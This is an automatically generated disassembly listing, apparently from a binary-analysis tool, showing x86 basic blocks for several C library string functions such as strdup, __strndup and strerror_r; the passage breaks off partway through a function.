0xb071ac2:	mov	edx, dword ptr [eax + 0x24]
0xb071ac5:	test	edx, edx
0xb071ac7:	je	0xb071ad8
None
|
|
|
v
0xb071ab0:	mov	eax, dword ptr [esp + 4]
0xb071ab4:	mov	ecx, dword ptr [eax + 0x30]
0xb071ab7:	test	ecx, ecx
0xb071ab9:	je	0xb071ac2
None
|
|
|
v
0xb071ac9:	mov	dword ptr [esp + 4], eax
0xb071acd:	jmp	0xb070880
None
|
|
|
v
0xb071abb:	mov	dword ptr [eax + 0x30], 0
0xb071ac2:	mov	edx, dword ptr [eax + 0x24]
0xb071ac5:	test	edx, edx
0xb071ac7:	je	0xb071ad8
None
|
|
|
v
0xb071ad8:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0722d0
TOTAL BLOCKS :9
0xb072310:	mov	eax, dword ptr [esp + 0x2c]
0xb072314:	mov	dword ptr [esi + 0x10], edi
0xb072317:	mov	dword ptr [esi + 0xc], edi
0xb07231a:	mov	dword ptr [esi + 4], edi
0xb07231d:	test	eax, eax
0xb07231f:	je	0xb072350
None
|
|
|
v
0xb072350:	mov	dword ptr [esi + 0x14], edi
0xb072353:	mov	dword ptr [esi + 0x18], edi
0xb072356:	mov	dword ptr [esi + 8], ebp
0xb072359:	jmp	0xb07232e
None
|
|
|
v
0xb0722f6:	mov	ebp, eax
0xb0722f8:	mov	dword ptr [esp + 0xc], 0
0xb072300:	mov	dword ptr [esp + 8], ebp
0xb072304:	mov	dword ptr [esp + 4], edi
0xb072308:	mov	dword ptr [esp], esi
0xb07230b:	call	0xb070bd0
None
|
|
|
v
0xb07232e:	mov	dword ptr [esi + 0x98], 0
0xb072338:	add	esp, 0x10
0xb07233b:	pop	esi
0xb07233c:	pop	edi
0xb07233d:	pop	ebp
0xb07233e:	ret	
None
|
|
|
v
0xb0722d0:	push	ebp
0xb0722d1:	push	edi
0xb0722d2:	push	esi
0xb0722d3:	sub	esp, 0x10
0xb0722d6:	mov	eax, dword ptr [esp + 0x28]
0xb0722da:	mov	esi, dword ptr [esp + 0x20]
0xb0722de:	mov	edi, dword ptr [esp + 0x24]
0xb0722e2:	test	eax, eax
0xb0722e4:	jne	0xb072340
None
|
|
|
v
0xb072340:	add	eax, edi
0xb072342:	mov	edx, 0xffffffff
0xb072347:	cmp	edi, eax
0xb072349:	cmovb	edx, eax
0xb07234c:	mov	ebp, edx
0xb07234e:	jmp	0xb0722f8
None
|
|
|
v
0xb0722f8:	mov	dword ptr [esp + 0xc], 0
0xb072300:	mov	dword ptr [esp + 8], ebp
0xb072304:	mov	dword ptr [esp + 4], edi
0xb072308:	mov	dword ptr [esp], esi
0xb07230b:	call	0xb070bd0
None
|
|
|
v
0xb072321:	mov	eax, dword ptr [esp + 0x2c]
0xb072325:	mov	dword ptr [esi + 0x18], ebp
0xb072328:	mov	dword ptr [esi + 0x14], eax
0xb07232b:	mov	dword ptr [esi + 8], eax
0xb07232e:	mov	dword ptr [esi + 0x98], 0
0xb072338:	add	esp, 0x10
0xb07233b:	pop	esi
0xb07233c:	pop	edi
0xb07233d:	pop	ebp
0xb07233e:	ret	
None
|
|
|
v
0xb0722e6:	mov	dword ptr [esp + 4], 0
0xb0722ee:	mov	dword ptr [esp], edi
0xb0722f1:	call	0xb07ed60
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07a520
TOTAL BLOCKS :40
0xb07a520:	push	edi
0xb07a521:	push	esi
0xb07a522:	push	ebx
0xb07a523:	push	ebp
0xb07a524:	mov	eax, dword ptr [esp + 0x14]
0xb07a528:	mov	edx, dword ptr [esp + 0x18]
0xb07a52c:	mov	edi, eax
0xb07a52e:	xor	ecx, ecx
0xb07a530:	mov	dh, dl
0xb07a532:	mov	cl, dl
0xb07a534:	shl	edx, 0x10
0xb07a537:	mov	ch, cl
0xb07a539:	or	edx, ecx
0xb07a53b:	and	edi, 3
0xb07a53e:	je	0xb07a581
None
|
|
|
v
0xb07a6ad:	pop	ebp
0xb07a6ae:	pop	ebx
0xb07a6af:	pop	esi
0xb07a6b0:	pop	edi
0xb07a6b1:	ret	
None
|
|
|
v
0xb07a65a:	xor	ebp, ecx
0xb07a65c:	add	edi, ecx
0xb07a65e:	lea	eax, dword ptr [eax + 4]
0xb07a661:	jae	0xb07a6b2
None
|
|
|
v
0xb07a6b2:	sub	eax, 4
0xb07a6b5:	cmp	cl, dl
0xb07a6b7:	je	0xb07a6ad
None
|
|
|
v
0xb07a58f:	xor	ebp, ecx
0xb07a591:	add	edi, ecx
0xb07a593:	lea	eax, dword ptr [eax + 4]
0xb07a596:	jae	0xb07a6b2
None
|
|
|
v
0xb07a6da:	xor	eax, eax
0xb07a6dc:	jmp	0xb07a6ad
None
|
|
|
v
0xb07a697:	sub	eax, 4
0xb07a69a:	test	bl, bl
0xb07a69c:	je	0xb07a6ad
None
|
|
|
v
0xb07a637:	mov	esi, 0xfefefeff
0xb07a63c:	xor	ebx, edx
0xb07a63e:	mov	ecx, dword ptr [eax]
0xb07a640:	add	esi, ebx
0xb07a642:	mov	edi, 0xfefefeff
0xb07a647:	jae	0xb07a697
None
|
|
|
v
0xb07a6c3:	cmp	ch, 0
0xb07a6c6:	je	0xb07a6da
None
|
|
|
v
0xb07a5ad:	mov	esi, 0xfefefeff
0xb07a5b2:	xor	ebx, edx
0xb07a5b4:	mov	ecx, dword ptr [eax]
0xb07a5b6:	add	esi, ebx
0xb07a5b8:	mov	edi, 0xfefefeff
0xb07a5bd:	jae	0xb07a697
None
|
|
|
v
0xb07a6d0:	cmp	cl, 0
0xb07a6d3:	je	0xb07a6da
None
|
|
|
v
0xb07a663:	mov	ebx, ecx
0xb07a665:	or	ebp, 0xfefefeff
0xb07a66b:	add	ebp, 1
0xb07a66e:	jne	0xb07a6b2
None
|
|
|
v
0xb07a6b9:	cmp	cl, 0
0xb07a6bc:	je	0xb07a6da
None
|
|
|
v
0xb07a5f6:	mov	esi, 0xfefefeff
0xb07a5fb:	xor	ebx, edx
0xb07a5fd:	mov	ecx, dword ptr [eax]
0xb07a5ff:	add	esi, ebx
0xb07a601:	mov	edi, 0xfefefeff
0xb07a606:	jae	0xb07a697
None
|
|
|
v
0xb07a670:	mov	esi, 0xfefefeff
0xb07a675:	xor	ebx, edx
0xb07a677:	mov	ecx, dword ptr [eax]
0xb07a679:	add	esi, ebx
0xb07a67b:	mov	edi, 0xfefefeff
0xb07a680:	jae	0xb07a697
None
|
|
|
v
0xb07a6c8:	shr	ecx, 0x10
0xb07a6cb:	inc	eax
0xb07a6cc:	cmp	cl, dl
0xb07a6ce:	je	0xb07a6ad
None
|
|
|
v
0xb07a60c:	mov	ebp, edi
0xb07a60e:	xor	esi, ebx
0xb07a610:	add	ebp, ecx
0xb07a612:	or	esi, 0xfefefeff
0xb07a618:	add	esi, 1
0xb07a61b:	jne	0xb07a697
None
|
|
|
v
0xb07a69e:	inc	eax
0xb07a69f:	test	bh, bh
0xb07a6a1:	je	0xb07a6ad
None
|
|
|
v
0xb07a580:	inc	eax
0xb07a581:	mov	ecx, dword ptr [eax]
0xb07a583:	mov	ebp, 0xfefefeff
0xb07a588:	mov	edi, 0xfefefeff
0xb07a58d:	add	ebp, ecx
0xb07a58f:	xor	ebp, ecx
0xb07a591:	add	edi, ecx
0xb07a593:	lea	eax, dword ptr [eax + 4]
0xb07a596:	jae	0xb07a6b2
None
|
|
|
v
0xb07a56d:	mov	cl, byte ptr [eax]
0xb07a56f:	cmp	dl, cl
0xb07a571:	je	0xb07a6ad
None
|
|
|
v
0xb07a54c:	xor	cl, dl
0xb07a54e:	je	0xb07a6da
None
|
|
|
v
0xb07a544:	xor	cl, byte ptr [eax]
0xb07a546:	je	0xb07a6ad
None
|
|
|
v
0xb07a649:	mov	ebp, edi
0xb07a64b:	xor	esi, ebx
0xb07a64d:	add	ebp, ecx
0xb07a64f:	or	esi, 0xfefefeff
0xb07a655:	add	esi, 1
0xb07a658:	jne	0xb07a697
None
|
|
|
v
0xb07a6ac:	inc	eax
0xb07a6ad:	pop	ebp
0xb07a6ae:	pop	ebx
0xb07a6af:	pop	esi
0xb07a6b0:	pop	edi
0xb07a6b1:	ret	
None
|
|
|
v
0xb07a577:	cmp	cl, 0
0xb07a57a:	je	0xb07a6da
None
|
|
|
v
0xb07a5d8:	xor	ebp, ecx
0xb07a5da:	add	edi, ecx
0xb07a5dc:	lea	eax, dword ptr [eax + 4]
0xb07a5df:	jae	0xb07a6b2
None
|
|
|
v
0xb07a6be:	inc	eax
0xb07a6bf:	cmp	ch, dl
0xb07a6c1:	je	0xb07a6ad
None
|
|
|
v
0xb07a560:	cmp	cl, 0
0xb07a563:	je	0xb07a6da
None
|
|
|
v
0xb07a5c3:	mov	ebp, edi
0xb07a5c5:	xor	esi, ebx
0xb07a5c7:	add	ebp, ecx
0xb07a5c9:	or	esi, 0xfefefeff
0xb07a5cf:	add	esi, 1
0xb07a5d2:	jne	0xb07a697
None
|
|
|
v
0xb07a554:	mov	cl, byte ptr [eax + 1]
0xb07a557:	inc	eax
0xb07a558:	cmp	dl, cl
0xb07a55a:	je	0xb07a6ad
None
|
|
|
v
0xb07a59c:	mov	ebx, ecx
0xb07a59e:	or	ebp, 0xfefefeff
0xb07a5a4:	add	ebp, 1
0xb07a5a7:	jne	0xb07a6b2
None
|
|
|
v
0xb07a62a:	mov	ebx, ecx
0xb07a62c:	or	ebp, 0xfefefeff
0xb07a632:	add	ebp, 1
0xb07a635:	jne	0xb07a6b2
None
|
|
|
v
0xb07a581:	mov	ecx, dword ptr [eax]
0xb07a583:	mov	ebp, 0xfefefeff
0xb07a588:	mov	edi, 0xfefefeff
0xb07a58d:	add	ebp, ecx
0xb07a58f:	xor	ebp, ecx
0xb07a591:	add	edi, ecx
0xb07a593:	lea	eax, dword ptr [eax + 4]
0xb07a596:	jae	0xb07a6b2
None
|
|
|
v
0xb07a6a3:	shr	ebx, 0x10
0xb07a6a6:	inc	eax
0xb07a6a7:	cmp	bl, 0
0xb07a6aa:	je	0xb07a6ad
None
|
|
|
v
0xb07a6d5:	inc	eax
0xb07a6d6:	cmp	ch, dl
0xb07a6d8:	je	0xb07a6ad
None
|
|
|
v
0xb07a569:	inc	eax
0xb07a56a:	dec	edi
0xb07a56b:	jne	0xb07a581
None
|
|
|
v
0xb07a540:	mov	cl, dl
0xb07a542:	jp	0xb07a56d
None
|
|
|
v
0xb07a5e5:	mov	ebx, ecx
0xb07a5e7:	or	ebp, 0xfefefeff
0xb07a5ed:	add	ebp, 1
0xb07a5f0:	jne	0xb07a6b2
None
|
|
|
v
0xb07a682:	mov	ebp, edi
0xb07a684:	xor	esi, ebx
0xb07a686:	add	ebp, ecx
0xb07a688:	or	esi, 0xfefefeff
0xb07a68e:	add	esi, 1
0xb07a691:	je	0xb07a58f
None
|
|
|
v
0xb07a61d:	xor	ebp, ecx
0xb07a61f:	add	edi, ecx
0xb07a621:	lea	eax, dword ptr [eax + 4]
0xb07a624:	jae	0xb07a6b2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07a740
TOTAL BLOCKS :5
0xb07a740:	mov	ecx, dword ptr [esp + 4]
0xb07a744:	mov	edx, dword ptr [esp + 8]
0xb07a748:	mov	al, byte ptr [ecx]
0xb07a74a:	cmp	al, byte ptr [edx]
0xb07a74c:	jne	0xb07a757
None
|
|
|
v
0xb07a757:	mov	eax, 1
0xb07a75c:	mov	ecx, 0xffffffff
0xb07a761:	cmovb	eax, ecx
0xb07a764:	ret	
None
|
|
|
v
0xb07a748:	mov	al, byte ptr [ecx]
0xb07a74a:	cmp	al, byte ptr [edx]
0xb07a74c:	jne	0xb07a757
None
|
|
|
v
0xb07a754:	xor	eax, eax
0xb07a756:	ret	
None
|
|
|
v
0xb07a74e:	inc	ecx
0xb07a74f:	inc	edx
0xb07a750:	test	al, al
0xb07a752:	jne	0xb07a748
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07a810
TOTAL BLOCKS :1
0xb07a810:	push	edi
0xb07a811:	push	esi
0xb07a812:	push	ebx
0xb07a813:	mov	edi, dword ptr [esp + 0x10]
0xb07a817:	mov	esi, dword ptr [esp + 0x14]
0xb07a81b:	xor	eax, eax
0xb07a81d:	lea	ecx, dword ptr [esi - 1]
0xb07a820:	mov	ebx, 0xfefefeff
0xb07a825:	and	ecx, 3
0xb07a828:	call	0xb07a82d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07a82d
TOTAL BLOCKS :1
0xb07a82d:	pop	edx
0xb07a82e:	lea	ecx, dword ptr [edx + ecx*8 + 0xb]
0xb07a832:	jmp	ecx
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strdup
TOTAL BLOCKS :7
0xb07ab1d:	lea	edi, dword ptr [eax + 1]
0xb07ab20:	mov	dword ptr [esp], edi
0xb07ab23:	call	0xb0173f0
None
|
|
|
v
0xb07ab00:	push	edi
0xb07ab01:	push	esi
0xb07ab02:	push	ebx
0xb07ab03:	sub	esp, 0x10
0xb07ab06:	call	0xb1267db
None
|
|
|
v
0xb07ab2c:	mov	dword ptr [esp + 8], edi
0xb07ab30:	mov	dword ptr [esp + 4], esi
0xb07ab34:	mov	dword ptr [esp], eax
0xb07ab37:	call	0xb07d0b0
None
|
|
|
v
0xb07ab0b:	add	ebx, 0x1304f5
0xb07ab11:	mov	esi, dword ptr [esp + 0x20]
0xb07ab15:	mov	dword ptr [esp], esi
0xb07ab18:	call	0xb07ae80
None
|
|
|
v
0xb07ab48:	xor	eax, eax
0xb07ab4a:	jmp	0xb07ab3c
None
|
|
|
v
0xb07ab3c:	add	esp, 0x10
0xb07ab3f:	pop	ebx
0xb07ab40:	pop	esi
0xb07ab41:	pop	edi
0xb07ab42:	ret	
None
|
|
|
v
0xb07ab28:	test	eax, eax
0xb07ab2a:	je	0xb07ab48
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__strndup
TOTAL BLOCKS :7
0xb07ab50:	push	edi
0xb07ab51:	push	esi
0xb07ab52:	push	ebx
0xb07ab53:	sub	esp, 0x10
0xb07ab56:	call	0xb1267db
None
|
|
|
v
0xb07ab5b:	add	ebx, 0x1304a5
0xb07ab61:	mov	eax, dword ptr [esp + 0x24]
0xb07ab65:	mov	edi, dword ptr [esp + 0x20]
0xb07ab69:	mov	dword ptr [esp + 4], eax
0xb07ab6d:	mov	dword ptr [esp], edi
0xb07ab70:	call	0xb017480
None
|
|
|
v
0xb07ab75:	mov	esi, eax
0xb07ab77:	lea	eax, dword ptr [eax + 1]
0xb07ab7a:	mov	dword ptr [esp], eax
0xb07ab7d:	call	0xb0173f0
None
|
|
|
v
0xb07ab86:	mov	byte ptr [eax + esi], 0
0xb07ab8a:	mov	dword ptr [esp + 8], esi
0xb07ab8e:	mov	dword ptr [esp + 4], edi
0xb07ab92:	mov	dword ptr [esp], eax
0xb07ab95:	call	0xb07d0b0
None
|
|
|
v
0xb07ab9a:	add	esp, 0x10
0xb07ab9d:	pop	ebx
0xb07ab9e:	pop	esi
0xb07ab9f:	pop	edi
0xb07aba0:	ret	
None
|
|
|
v
0xb07ab82:	test	eax, eax
0xb07ab84:	je	0xb07aba8
None
|
|
|
v
0xb07aba8:	xor	eax, eax
0xb07abaa:	jmp	0xb07ab9a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strerror_r
TOTAL BLOCKS :23
0xb07ad42:	cmp	edi, dword ptr [esp + 0x68]
0xb07ad46:	jae	0xb07ad78
None
|
|
|
v
0xb07acc7:	lea	eax, dword ptr [ebx - 0x4940b]
0xb07accd:	mov	dword ptr [esp + 4], eax
0xb07acd1:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb07acd7:	mov	dword ptr [esp + 8], 5
0xb07acdf:	mov	dword ptr [esp], eax
0xb07ace2:	call	0xb028340
None
|
|
|
v
0xb07ad99:	lea	eax, dword ptr [ebx - 0x4940b]
0xb07ad9f:	mov	dword ptr [esp + 4], eax
0xb07ada3:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb07ada9:	mov	dword ptr [esp + 8], 5
0xb07adb1:	mov	dword ptr [esp], eax
0xb07adb4:	call	0xb028340
None
|
|
|
v
0xb07ac80:	add	ebx, 0x130380
0xb07ac86:	test	esi, esi
0xb07ac88:	js	0xb07acc7
None
|
|
|
v
0xb07ace7:	mov	dword ptr [esp], eax
0xb07acea:	mov	ebp, eax
0xb07acec:	call	0xb07ae80
None
|
|
|
v
0xb07ad78:	mov	eax, dword ptr [esp + 0x68]
0xb07ad7c:	test	eax, eax
0xb07ad7e:	je	0xb07ad8d
None
|
|
|
v
0xb07acf1:	mov	dword ptr [esp + 0xc], 0
0xb07acf9:	mov	dword ptr [esp + 8], 0xa
0xb07ad01:	mov	byte ptr [esp + 0x3f], 0
0xb07ad06:	mov	edi, eax
0xb07ad08:	lea	eax, dword ptr [esp + 0x3f]
0xb07ad0c:	mov	dword ptr [esp + 4], eax
0xb07ad10:	mov	eax, esi
0xb07ad12:	sar	eax, 0x1f
0xb07ad15:	xor	esi, eax
0xb07ad17:	sub	esi, eax
0xb07ad19:	mov	dword ptr [esp], esi
0xb07ad1c:	call	0xb043170
None
|
|
|
v
0xb07ad8d:	mov	eax, dword ptr [esp + 0x64]
0xb07ad91:	add	esp, 0x4c
0xb07ad94:	pop	ebx
0xb07ad95:	pop	esi
0xb07ad96:	pop	edi
0xb07ad97:	pop	ebp
0xb07ad98:	ret	
None
|
|
|
v
0xb07ac8a:	cmp	esi, dword ptr [ebx - 0x41914]
0xb07ac90:	jge	0xb07ad99
None
|
|
|
v
0xb07ae20:	mov	edx, eax
0xb07ae22:	jmp	0xb07ad51
None
|
|
|
v
0xb07aca5:	mov	dword ptr [esp + 4], eax
0xb07aca9:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb07acaf:	mov	dword ptr [esp + 8], 5
0xb07acb7:	mov	dword ptr [esp], eax
0xb07acba:	call	0xb028340
None
|
|
|
v
0xb07ad57:	mov	eax, dword ptr [esp + 0x68]
0xb07ad5b:	lea	ecx, dword ptr [esp + 0x40]
0xb07ad5f:	sub	ecx, esi
0xb07ad61:	mov	dword ptr [esp + 4], esi
0xb07ad65:	mov	dword ptr [esp], edx
0xb07ad68:	sub	eax, edi
0xb07ad6a:	cmp	ecx, eax
0xb07ad6c:	cmovbe	eax, ecx
0xb07ad6f:	mov	dword ptr [esp + 8], eax
0xb07ad73:	call	0xb07d0b0
None
|
|
|
v
0xb07acbf:	add	esp, 0x4c
0xb07acc2:	pop	ebx
0xb07acc3:	pop	esi
0xb07acc4:	pop	edi
0xb07acc5:	pop	ebp
0xb07acc6:	ret	
None
|
|
|
v
0xb07ad80:	mov	eax, dword ptr [esp + 0x64]
0xb07ad84:	mov	edx, dword ptr [esp + 0x68]
0xb07ad88:	mov	byte ptr [eax + edx - 1], 0
0xb07ad8d:	mov	eax, dword ptr [esp + 0x64]
0xb07ad91:	add	esp, 0x4c
0xb07ad94:	pop	ebx
0xb07ad95:	pop	esi
0xb07ad96:	pop	edi
0xb07ad97:	pop	ebp
0xb07ad98:	ret	
None
|
|
|
v
0xb07adfb:	mov	edx, dword ptr [esp + 0x1c]
0xb07adff:	cmp	edi, dword ptr [esp + 0x68]
0xb07ae03:	mov	dword ptr [esp + 4], edx
0xb07ae07:	mov	esi, eax
0xb07ae09:	mov	eax, edi
0xb07ae0b:	cmova	eax, dword ptr [esp + 0x68]
0xb07ae10:	mov	dword ptr [esp + 8], eax
0xb07ae14:	mov	eax, dword ptr [esp + 0x64]
0xb07ae18:	mov	dword ptr [esp], eax
0xb07ae1b:	call	0xb07cad0
None
|
|
|
v
0xb07ac96:	mov	eax, dword ptr [ebx + esi*4 - 0x1cc0]
0xb07ac9d:	test	eax, eax
0xb07ac9f:	je	0xb07ad99
None
|
|
|
v
0xb07adc6:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0xb07adb9:	or	ecx, 0xffffffff
0xb07adbc:	mov	edx, eax
0xb07adbe:	xor	eax, eax
0xb07adc0:	mov	edi, edx
0xb07adc2:	mov	dword ptr [esp + 0x1c], edx
0xb07adc6:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0xb07ac70:	push	ebp
0xb07ac71:	push	edi
0xb07ac72:	push	esi
0xb07ac73:	push	ebx
0xb07ac74:	sub	esp, 0x4c
0xb07ac77:	mov	esi, dword ptr [esp + 0x60]
0xb07ac7b:	call	0xb1267db
None
|
|
|
v
0xb07ad51:	cmp	edi, dword ptr [esp + 0x68]
0xb07ad55:	jae	0xb07ad78
None
|
|
|
v
0xb07adc8:	lea	eax, dword ptr [esp + 0x3f]
0xb07adcc:	mov	dword ptr [esp + 4], eax
0xb07add0:	mov	eax, esi
0xb07add2:	sar	eax, 0x1f
0xb07add5:	xor	esi, eax
0xb07add7:	sub	esi, eax
0xb07add9:	mov	dword ptr [esp], esi
0xb07addc:	not	ecx
0xb07adde:	mov	dword ptr [esp + 0xc], 0
0xb07ade6:	lea	edi, dword ptr [ecx - 1]
0xb07ade9:	mov	dword ptr [esp + 8], 0xa
0xb07adf1:	mov	byte ptr [esp + 0x3f], 0
0xb07adf6:	call	0xb043170
None
|
|
|
v
0xb07ad21:	cmp	edi, dword ptr [esp + 0x68]
0xb07ad25:	mov	dword ptr [esp + 4], ebp
0xb07ad29:	mov	esi, eax
0xb07ad2b:	mov	eax, edi
0xb07ad2d:	cmova	eax, dword ptr [esp + 0x68]
0xb07ad32:	mov	dword ptr [esp + 8], eax
0xb07ad36:	mov	eax, dword ptr [esp + 0x64]
0xb07ad3a:	mov	dword ptr [esp], eax
0xb07ad3d:	call	0xb07cad0
None
|
|
|
v
0xb07ad48:	lea	edx, dword ptr [eax + 1]
0xb07ad4b:	add	edi, 1
0xb07ad4e:	mov	byte ptr [eax], 0x2d
0xb07ad51:	cmp	edi, dword ptr [esp + 0x68]
0xb07ad55:	jae	0xb07ad78
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07ae80
TOTAL BLOCKS :20
0xb07aecb:	mov	ecx, dword ptr [eax]
0xb07aecd:	add	eax, 4
0xb07aed0:	sub	edx, ecx
0xb07aed2:	add	ecx, 0xfefefeff
0xb07aed8:	dec	edx
0xb07aed9:	jae	0xb07af19
None
|
|
|
v
0xb07ae8d:	jp	0xb07aea6
None
|
|
|
v
0xb07aea6:	cmp	byte ptr [eax], dh
0xb07aea8:	je	0xb07af36
None
|
|
|
v
0xb07aee5:	mov	ecx, dword ptr [eax]
0xb07aee7:	add	eax, 4
0xb07aeea:	sub	edx, ecx
0xb07aeec:	add	ecx, 0xfefefeff
0xb07aef2:	dec	edx
0xb07aef3:	jae	0xb07af19
None
|
|
|
v
0xb07af35:	inc	eax
0xb07af36:	sub	eax, dword ptr [esp + 4]
0xb07af3a:	ret	
None
|
|
|
v
0xb07aeae:	inc	eax
0xb07aeaf:	xor	edx, edx
0xb07aeb1:	mov	ecx, dword ptr [eax]
0xb07aeb3:	add	eax, 4
0xb07aeb6:	sub	edx, ecx
0xb07aeb8:	add	ecx, 0xfefefeff
0xb07aebe:	dec	edx
0xb07aebf:	jae	0xb07af19
None
|
|
|
v
0xb07aeff:	mov	ecx, dword ptr [eax]
0xb07af01:	add	eax, 4
0xb07af04:	sub	edx, ecx
0xb07af06:	add	ecx, 0xfefefeff
0xb07af0c:	dec	edx
0xb07af0d:	jae	0xb07af19
None
|
|
|
v
0xb07ae80:	mov	eax, dword ptr [esp + 4]
0xb07ae84:	mov	edx, 3
0xb07ae89:	and	edx, eax
0xb07ae8b:	je	0xb07aeb1
None
|
|
|
v
0xb07af36:	sub	eax, dword ptr [esp + 4]
0xb07af3a:	ret	
None
|
|
|
v
0xb07ae97:	inc	eax
0xb07ae98:	cmp	byte ptr [eax], dh
0xb07ae9a:	je	0xb07af36
None
|
|
|
v
0xb07aea0:	inc	eax
0xb07aea1:	xor	edx, 2
0xb07aea4:	je	0xb07aeb1
None
|
|
|
v
0xb07aedb:	xor	edx, ecx
0xb07aedd:	and	edx, 0x1010100
0xb07aee3:	jne	0xb07af19
None
|
|
|
v
0xb07af27:	inc	eax
0xb07af28:	test	ch, ch
0xb07af2a:	je	0xb07af36
None
|
|
|
v
0xb07af19:	sub	eax, 4
0xb07af1c:	sub	ecx, 0xfefefeff
0xb07af22:	cmp	cl, 0
0xb07af25:	je	0xb07af36
None
|
|
|
v
0xb07aef5:	xor	edx, ecx
0xb07aef7:	and	edx, 0x1010100
0xb07aefd:	jne	0xb07af19
None
|
|
|
v
0xb07af0f:	xor	edx, ecx
0xb07af11:	and	edx, 0x1010100
0xb07af17:	je	0xb07aeb1
None
|
|
|
v
0xb07aec1:	xor	edx, ecx
0xb07aec3:	and	edx, 0x1010100
0xb07aec9:	jne	0xb07af19
None
|
|
|
v
0xb07ae8f:	cmp	byte ptr [eax], dh
0xb07ae91:	je	0xb07af36
None
|
|
|
v
0xb07aeb1:	mov	ecx, dword ptr [eax]
0xb07aeb3:	add	eax, 4
0xb07aeb6:	sub	edx, ecx
0xb07aeb8:	add	ecx, 0xfefefeff
0xb07aebe:	dec	edx
0xb07aebf:	jae	0xb07af19
None
|
|
|
v
0xb07af2c:	shr	ecx, 0x10
0xb07af2f:	inc	eax
0xb07af30:	cmp	cl, 0
0xb07af33:	je	0xb07af36
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07b750
TOTAL BLOCKS :21
0xb07b870:	cmp	ecx, dword ptr [esp + 0xc]
0xb07b874:	je	0xb07b890
None
|
|
|
v
0xb07b780:	mov	eax, dword ptr [esp + 8]
0xb07b784:	mov	edi, dword ptr [esp + 4]
0xb07b788:	add	edi, eax
0xb07b78a:	movzx	eax, byte ptr [edi + ecx]
0xb07b78e:	mov	edi, dword ptr [esp + 4]
0xb07b792:	cmp	byte ptr [edi + edx], al
0xb07b795:	jae	0xb07b828
None
|
|
|
v
0xb07b750:	push	ebp
0xb07b751:	mov	ecx, 1
0xb07b756:	push	edi
0xb07b757:	mov	ebp, 1
0xb07b75c:	push	esi
0xb07b75d:	xor	esi, esi
0xb07b75f:	sub	esp, 0x10
0xb07b762:	mov	dword ptr [esp], edx
0xb07b765:	mov	dword ptr [esp + 8], 0xffffffff
0xb07b76d:	mov	dword ptr [esp + 4], eax
0xb07b771:	lea	esi, dword ptr [esi]
0xb07b778:	lea	edx, dword ptr [ecx + esi]
0xb07b77b:	cmp	edx, dword ptr [esp]
0xb07b77e:	jae	0xb07b7b0
None
|
|
|
v
0xb07b828:	je	0xb07b860
None
|
|
|
v
0xb07b79b:	mov	esi, edx
0xb07b79d:	mov	ecx, 1
0xb07b7a2:	mov	ebp, edx
0xb07b7a4:	lea	edx, dword ptr [ecx + esi]
0xb07b7a7:	sub	ebp, dword ptr [esp + 8]
0xb07b7ab:	cmp	edx, dword ptr [esp]
0xb07b7ae:	jb	0xb07b780
None
|
|
|
v
0xb07b81e:	add	esp, 0x10
0xb07b821:	pop	esi
0xb07b822:	pop	edi
0xb07b823:	pop	ebp
0xb07b824:	ret	
None
|
|
|
v
0xb07b7b0:	mov	edi, dword ptr [esp + 0x20]
0xb07b7b4:	mov	ecx, 1
0xb07b7b9:	xor	esi, esi
0xb07b7bb:	mov	dword ptr [esp + 0xc], 1
0xb07b7c3:	mov	dword ptr [edi], ebp
0xb07b7c5:	mov	edi, 0xffffffff
0xb07b7ca:	lea	esi, dword ptr [esi]
0xb07b7d0:	lea	edx, dword ptr [ecx + esi]
0xb07b7d3:	cmp	dword ptr [esp], edx
0xb07b7d6:	jbe	0xb07b804
None
|
|
|
v
0xb07b804:	mov	eax, dword ptr [esp + 8]
0xb07b808:	add	edi, 1
0xb07b80b:	add	eax, 1
0xb07b80e:	cmp	edi, eax
0xb07b810:	jb	0xb07b81e
None
|
|
|
v
0xb07b880:	mov	esi, edx
0xb07b882:	mov	ecx, 1
0xb07b887:	jmp	0xb07b778
None
|
|
|
v
0xb07b842:	mov	edi, esi
0xb07b844:	mov	ecx, 1
0xb07b849:	add	esi, 1
0xb07b84c:	mov	dword ptr [esp + 0xc], 1
0xb07b854:	jmp	0xb07b7d0
None
|
|
|
v
0xb07b7ed:	mov	eax, edx
0xb07b7ef:	mov	esi, edx
0xb07b7f1:	mov	ecx, 1
0xb07b7f6:	sub	eax, edi
0xb07b7f8:	lea	edx, dword ptr [ecx + esi]
0xb07b7fb:	cmp	dword ptr [esp], edx
0xb07b7fe:	mov	dword ptr [esp + 0xc], eax
0xb07b802:	ja	0xb07b7d8
None
|
|
|
v
0xb07b812:	mov	eax, dword ptr [esp + 0x20]
0xb07b816:	mov	esi, dword ptr [esp + 0xc]
0xb07b81a:	mov	dword ptr [eax], esi
0xb07b81c:	mov	eax, edi
0xb07b81e:	add	esp, 0x10
0xb07b821:	pop	esi
0xb07b822:	pop	edi
0xb07b823:	pop	ebp
0xb07b824:	ret	
None
|
|
|
v
0xb07b876:	add	ecx, 1
0xb07b879:	jmp	0xb07b7d0
None
|
|
|
v
0xb07b860:	cmp	ecx, ebp
0xb07b862:	je	0xb07b880
None
|
|
|
v
0xb07b7d0:	lea	edx, dword ptr [ecx + esi]
0xb07b7d3:	cmp	dword ptr [esp], edx
0xb07b7d6:	jbe	0xb07b804
None
|
|
|
v
0xb07b864:	add	ecx, 1
0xb07b867:	jmp	0xb07b778
None
|
|
|
v
0xb07b82a:	mov	dword ptr [esp + 8], esi
0xb07b82e:	mov	ebp, 1
